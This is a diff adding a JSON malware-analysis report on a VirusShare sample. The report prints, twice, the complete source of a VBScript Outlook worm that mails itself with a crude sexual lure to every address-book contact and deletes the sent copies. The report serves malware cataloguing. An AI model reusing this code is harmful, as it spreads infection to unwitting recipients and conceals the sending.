@@ -1,0 +1,51 @@
+{
+    "docinfo": {
+        "attributes": [],
+        "behavior": {
+            "Base64 Strings": "Base64-encoded str were detected, may be used to obfuscate str",
+            "CreateObject": "May create an OLE object",
+            "Open": "May open a file"
+        },
+        "macro": "On Error Resume Next\nDim OL01, OL02, OL03, OL04, OL05\nDim RG01, RG02\nSet OL01 = CreateObject( \"Outlook.Application\" )\nSet OL02 = OL01.GetNameSpace( \"MAPI\" )\nFor Each OL03 In OL02.AddressLists\nFor OL04 = 1 To OL03.AddressEntries.Count\n    Set OL05 = OL01.CreateItem( 0 )\n      OL05.BCC = OL03.AddressEntries( OL04 ).Address\n      OL05.Subject = \"r u FEELING HORNY?  Do you feel like stroking it or rubbing it?\"\n    OL05.Body = \"Well this should make you CUM in your pantz! I know its gonna make me CUM!  Quick Open your mouth!!mmmmmmm!\"\n       OL05.Attachments.Add WScript.ScriptFullName\n        OL05.DeleteAfterSubmit = True\n       OL05.Send\nNext\nNext"
+    },
+    "filename": "VirusShare_b90df190ebbcbcb96edeef146d1fb977",
+    "filesize": 668,
+    "filetype": "ASCII text, with CRLF line terminators",
+    "hashes": {
+        "md5": "b90df190ebbcbcb96edeef146d1fb977",
+        "sha1": "de9de018740e10e3fb25e131d1b2329e70d9a80b",
+        "sha256": "c4a10ea6f6baf8446f5acb417cec9aa131d36b25df52de39843abe8a06ec2809"
+    },
+    "peinfo": {},
+    "strings": {
+        "dump": [
+            "On Error Resume Next",
+            "Dim OL01, OL02, OL03, OL04, OL05",
+            "Dim RG01, RG02",
+            "Set OL01 = CreateObject( \"Outlook.Application\" )",
+            "Set OL02 = OL01.GetNameSpace( \"MAPI\" )",
+            "For Each OL03 In OL02.AddressLists",
+            "For OL04 = 1 To OL03.AddressEntries.Count",
+            "    Set OL05 = OL01.CreateItem( 0 )",
+            "      OL05.BCC = OL03.AddressEntries( OL04 ).Address",
+            "      OL05.Subject = \"r u FEELING HORNY?  Do you feel like stroking it or rubbing it?\"",
+            "    OL05.Body = \"Well this should make you CUM in your pantz! I know its gonna make me CUM!  Quick Open your mouth!!mmmmmmm!\"",
+            "       OL05.Attachments.Add WScript.ScriptFullName",
+            "        OL05.DeleteAfterSubmit = True",
+            "       OL05.Send",
+            "Next",
+            "Next"
+        ],
+        "file": {},
+        "fuzzing": {},
+        "ip": [],
+        "url": []
+    },
+    "time": "0:00:00.277210",
+    "version": "6.0.3",
+    "virustotal": {
+        "positives": "",
+        "total": ""
+    },
+    "yara_plugins": []
+}
